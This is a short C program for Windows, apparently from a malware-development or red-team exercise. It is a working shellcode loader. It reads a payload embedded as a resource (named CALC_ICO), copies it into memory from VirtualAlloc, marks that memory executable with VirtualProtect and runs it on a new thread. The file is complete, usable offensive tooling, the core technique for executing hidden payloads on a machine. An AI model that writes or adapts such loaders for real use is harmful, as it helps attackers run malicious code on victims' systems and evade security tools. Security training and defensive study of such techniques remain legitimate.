#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h> 
#include "resources.h"

int main(){
    printf("[*] Program is running\n");

    void * exec_mem;
	BOOL rv;
	HANDLE th;
    DWORD oldprotect = 0;	
	unsigned char *payload;
	unsigned int payload_len;

	HRSRC res = FindResource(NULL, MAKEINTRESOURCE(CALC_ICO), RT_RCDATA);
	HGLOBAL resource_handle = LoadResource(NULL, res);
	payload_len = SizeofResource(NULL, res);
	payload = (unsigned char *)LockResource(resource_handle);
	// payload_len = resource_size;

	// Allocate memory
	exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	printf("%-20s : 0x%-016p\n", "payload addr", (void *)payload);
	printf("%-20s : 0x%-016p\n", "exec_mem addr", (void *)exec_mem);

	//Copy payload to new buffer
	RtlMoveMemory(exec_mem, payload, payload_len);
	
	// Make new buffer as executable
	rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);

	printf("%-20s : 0x%-016p\n", "[*] Shellcode loaded at " , (void *)exec_mem);

	printf("[*] Enter to run shellcode! [*]\n");
	getchar();

	// If all good, run the payload
	if ( rv != 0 ) {
			th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
			WaitForSingleObject(th, -1);
	}

    
}